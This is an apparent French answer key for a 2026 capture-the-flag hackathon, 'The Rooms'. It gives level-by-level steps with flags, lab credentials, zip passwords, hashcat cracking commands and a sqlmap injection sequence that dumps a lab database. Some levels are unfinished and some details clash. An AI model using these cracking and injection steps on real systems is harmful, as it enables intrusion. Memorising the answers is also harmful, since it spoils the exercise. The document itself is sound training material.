![separe](https://github.com/studoo-app/.github/blob/main/profile/studoo-banner-logo.png)
# Hackathon 2026 - The Rooms - SOLUTION
[![Version](https://img.shields.io/badge/Version-2026-blue)]()

## Solution détaillée

### Niveau 1: Exploration systèmes Linux

- lister les fichiers et dossiers cachés avec `ls -la`
- trouver le dossier caché `.secrets/.hidden` et accéder à son contenu
- trouver le fichier `secret-key.txt` et son contenu afin de décompresser l'archive `secret.zip
- décompresser l'archive `secret.zip` pour trouver le mot de passe du niveau suivant
- Le fichier backup_credentials.txt est un leurre, il contient des informations fausses pour détourner les participants

**Décompression de l'archive:**
```bash
  unzip -P 9VOsfCMsHhAiIohU secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{h1dd3n_1n_pl41n_s1ght}
- contenu du fichier key_part.txt : 7205137a8b8327274b49e063e94e91f95ae085728772c57e12decf1549dff6dc
- contenu du fichier next_level.txt : 
  - Host : 10.100.0.4 
  - User : roger 
  - Pass : LQU8PvANkAuYitkQ


### Niveau 2: Authentification SSH par clé privée

- lister les fichiers et dossiers cachés avec `ls -la`
- trouver le dossier caché `.confidential/.hidden` et accéder à son contenu
- trouver le fichier `key_rsa` et l'utiliser pour se connecter en SSH au niveau suivant
- Le dossier `.keys` est un leurre, il contient des clés privées qui ne fonctionnent pas

**Commande pour se connecter en SSH avec la clé privée:**
```bash
# se rendre dans /confidential/.hidden
ssh -i key_rsa yvette@10.100.2.4
```

**Décompression de l'archive:**
```bash
  unzip -P UDc4kyqHxurVDnYt secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{pr1v4t3_k3y_unl0ck3d}
- contenu du fichier key_part.txt : fe61fe7b7f73810ae1c425368800ee29452da9b4368bb87b78cbb9c1307b6b67
- contenu du fichier next_level.txt :
    - Host : 10.100.0.5
    - User : bernard
    - Pass : gLCGN9pvWG1EY7MR

### Niveau 3: Détecter le / les cryptages utilisés et décoder des messages


- lister les fichiers et dossiers cachés avec `ls -la`
- trouver le dossier caché `.vault` et accéder à son contenu
- Le fichier `encrypted_message` contient un message chiffré, il faut détecter le type de chiffrement utilisé le déchiffrer
- Etape 1 : Décoder le message qui en est encodé en base64
- Etape 2 : reperer le param password dans la chaine obtenu, ainsi que le param algo
- Etape 3 : Utiliser hashcat pour cracker le mot de passe en utilisant l'algo spécifié (md5) et le fichier dictionnaire rockyou.txt
  - `hashcat -m 0 -a 0 <hash> dicts/rockyou.txt`

**Décompression de l'archive:**
```bash
  unzip -P a3to1NNUGu84xTv5 secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{3ncrypt10n_15_n0t_s3cur1ty}
- contenu du fichier key_part.txt : 788d1b27411e1a09a54530f62516930719178621f993c9b0cb8c77e7fbec7d8e
- contenu du fichier next_level.txt :
    - Host : 10.100.0.6
    - User : gerard
    - Pass : AHslMhf94Rsm5rJj

### Niveau 4: Naviguer dans le labyrinthe et trouver la sortie

- Pour trouver la sortie du labyrinthe, il faut se suivre les IPs se terminant par des nombre premiers dans l'ordre croissant
- Il est possible de trouver ces IPs en analysant le reseau avec nmap, ensuite les fichiers de configuration SSH des différents nœuds du labyrinthe, chaque fichier conntient une restriction d'accès à une IP spécifique
- Voici la liste des IPs à suivre pour trouver la sortie du labyrinthe:
  - 10.100.4.17 (node 0)
  - 10.100.4.23 (node 1)
  - 10.100.4.31 (node 3)
  - 10.100.4.37 (node 5)
- Les autres IPs sont des leurres, elles ne mènent à rien ou à des impasses

**Décompression de l'archive:**
```bash
  unzip -P rtCR0iSQKclZrLUA secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{pr0xy_jump_m4st3r}
- contenu du fichier key_part.txt : 9eed1b9a30452d215a2809232c05cf7234178fb1d016c447b66b794082374ae9
- contenu du fichier next_level.txt :
    - Host : 10.100.0.7
    - User : josiane
    - Pass : OLZkJEQWY6rNO9Uf

### Niveau 5: Utiliser le social engineering pour obtenir des informations et cracker un mot de passe

Le mot de passe à cracker est contenu dans le ficher home/lvl05/security/hash.txt. Ce dernier est encodé en sha512.

Le but ici est de construire un dictionnaire à analysant les données dispersées dans les différentes dossiers.
Il apparait alors qu'il ya une plus grande somme d'informations pour l'employé Alice Martin, et que le contenu de ces 
documents parlent souvent de son voyage à Tokyo en 2019.

En associant ces informations et la note sur la potilitique de mot de passe, on peut faire l'hypothèse que le mot de passe
d'Alice Martin est une variation autour de ce voyage à Tokyo en 2019. 

Mot de passe : Tokyo2019!

Commande hashcat pour cracker le mot de passe:
```bash
hashcat -m 1800 -a 0 <hash> -o cracked_passwords.txt
# -m 1800 : spécifie le type de hash (sha512)
```

**Décompression de l'archive:**
```bash
  unzip -P Tokyo2019! secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{s0c14l_h4ck_c0mpl3t3}
- contenu du fichier key_part.txt : ce3eb117e71e238b84987169da5c5bc6da17c508108cdc568d39cf6efae6dca4
- contenu du fichier next_level.txt :
    - Host : 10.100.0.8
    - User : michel
    - Pass : AHslMhf94Rsm5rJj

### Niveau 6: Trouver la bonne séquence

**WORK IN PROGRESS**

Auditer le fichier history des commandes bash pour trouver la séquence de port knocking permettant d'ouvrir le port ssh et se connecter à la machine suivante

### Niveau 7: Attaquer la base de données d'un site web

Requeter le site web via curl afin de forger une commande sqlmap afin de s'injecter dans la base de données

```bash
# 1 - Curl initial pour analyser la requete et trouver le parametre vulnérable
curl -i "http://10.100.7.4"


sqlmap -u "http://10.100.7.4?search=test" --batch

# 2. Lister les bases
sqlmap -u "http://10.100.7.4?search=test" --dbs --batch
# Output: deepdive_db

# 3. Lister les tables de la base recettes_db
sqlmap -u "http://10.100.7.4?search=test" -D recettes_db --tables --batch
# Output: users, credentials, system_access

# 4. Dumper la table recettes de la base recettes_db
sqlmap -u "http://localhost/api/search.php?id=1" -D recettes_db -T recettes --dump --batch

# 5. Trouver le binaire caché dans les recettes

"1010100 1101000 1100101 100000 1110000 1100001 1110011 1110011 1110111 1101111 1110010 1100100 100000 1111001 1101111
 1110101 100000 1101100 1101111 1101111 1101011 1101001 1101110 1100111 100000 1100110 1101111 1110010 100000 1101001
 1110011 100000 111010 100000 1111001 1010010 1110110 110111 1001100 1000010 1110100 1100101 110110 1110010 1000101
 110100 1111010 1111000 1101110 1011001"

# Le convertir en texte clair pour trouver la passphrase de la clé ssh

"The password you looking for is : yRv7LBte6rE4zxnY"

```
**Décompression de l'archive:**
```bash
  unzip -P yRv7LBte6rE4zxnY secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{s0c14l_h4ck_c0mpl3t3}
- contenu du fichier key_part.txt : 4bd651b5622efa943d75d5c0dc7d9292d565ad16d05afeebb320dd3f1f6a9c89
- contenu du fichier next_level.txt :
    - Host : 10.100.0.10
    - User : huguette
    - Pass : LQU8PvANkAuYitkQ

### Niveau 8: Fragment Hunt

L'idée ici est de récupérer des fragments d'informations détenues dans les 4 machines gardiennes. 
Chaque machine contient:
 - Une partie de la sequence de port knocking 
 - Une partie de la passphrase de la clé ssh

- Premier Gardien
  - WIP
  - WIP
- Deuxième Gardien
  - WIP
  - WIP
- Troisième Gardien
  - WIP
  - WIP
- Quatrième Gardien
  - WIP
  - WIP
  
  **WORK IN PROGRESS**

### Niveau 9: The End

Vous avez triomphé de tous les défis et vous êtes arrivé à la fin du labyrinthe. Félicitations !
